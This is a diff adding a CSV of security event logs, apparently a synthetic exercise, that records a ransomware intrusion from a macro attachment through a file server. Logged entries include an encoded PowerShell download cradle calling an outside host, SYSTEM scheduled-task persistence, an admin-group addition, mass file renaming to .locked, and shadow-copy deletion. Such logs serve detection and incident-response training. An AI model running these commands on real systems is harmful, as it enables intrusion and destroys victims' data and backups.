@@ -1,0 +1,27 @@
+ts_local,host,event_id,user,src_ip,process,parent,cmdline,outcome
+08:38:05,FS-01,4624,svc_backup,10.10.20.14,,,,success logon type 5 (service)
+08:52:11,SCAN-01,net,scanner,10.10.20.50,nmap,bash,"nmap -Pn -p 445,3389 10.10.20.21",3 ports filtered
+08:58:02,WS-014,11,m.hassan,,outlook.exe,explorer.exe,attachment saved: invoice_Q3.docm,file created C:/Users/m.hassan/Downloads/invoice_Q3.docm
+09:01:15,WS-014,1,m.hassan,,winword.exe,explorer.exe,C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE /n invoice_Q3.docm,started
+09:01:40,WS-014,1,m.hassan,,powershell.exe,winword.exe,powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,started
+09:01:50,WS-014,22,m.hassan,,powershell.exe,winword.exe,DNS query cdn-sync.example type A,resolved 203.0.113.66
+09:02:05,WS-014,3,m.hassan,,powershell.exe,winword.exe,connect 203.0.113.66:443,established
+09:02:30,WS-014,1,m.hassan,,schtasks.exe,powershell.exe,"schtasks /create /tn ""Updater"" /tr ""powershell -w hidden -enc SQBFAFgA"" /sc minute /mo 5 /ru SYSTEM",created
+09:06:40,WS-014,4732,m.hassan,,net.exe,cmd.exe,net localgroup administrators svc_helpdesk2 /add,member added
+09:07:12,WS-014,4624,helpdesk.admin,10.10.20.77,,,,success logon type 10 (RDP)
+09:08:00,WS-014,1,helpdesk.admin,,taskmgr.exe,explorer.exe,taskmgr.exe,started
+09:09:14,DC-01,4625,m.hassan,10.10.20.14,,,,failure: bad password
+09:09:30,DC-01,4625,m.hassan,10.10.20.14,,,,failure: bad password
+09:10:02,DC-01,4624,m.hassan,10.10.20.14,,,,success logon type 3
+09:10:10,FS-01,4624,svc_backup,10.10.20.14,,,,success logon type 3 (network)
+09:10:12,FS-01,4672,svc_backup,,,,,special privileges assigned
+09:10:40,FS-01,11,svc_backup,,cmd.exe,,rename payroll_Q3.xlsx to payroll_Q3.xlsx.locked,4 files renamed
+09:10:52,FS-01,11,svc_backup,,cmd.exe,,rename contracts.zip to contracts.zip.locked,12 files renamed
+09:11:05,FS-01,11,svc_backup,,cmd.exe,,rename design_specs.docx to design_specs.docx.locked,9 files renamed
+09:12:00,WS-014,22,m.hassan,,powershell.exe,schtasks.exe,DNS query cdn-sync.example type A,resolved 203.0.113.66
+09:12:30,FS-01,1,svc_backup,,vssadmin.exe,cmd.exe,vssadmin delete shadows /all /quiet,shadow copies deleted
+09:15:00,WS-014,1,admin.javed,,powershell.exe,explorer.exe,powershell.exe -nop -enc ZwBlAHQALQBwAHIAbwBjAGUAcwBzAA==,started
+09:17:00,WS-014,22,m.hassan,,powershell.exe,schtasks.exe,DNS query cdn-sync.example type A,resolved 203.0.113.66
+09:21:07,FS-01,4624,admin.javed,10.10.20.60,,,,success logon type 3
+09:22:00,WS-014,22,m.hassan,,powershell.exe,schtasks.exe,DNS query cdn-sync.example type A,resolved 203.0.113.66
+09:25:20,FS-01,4624,svc_backup,10.10.20.14,,,,success logon type 3 (network)
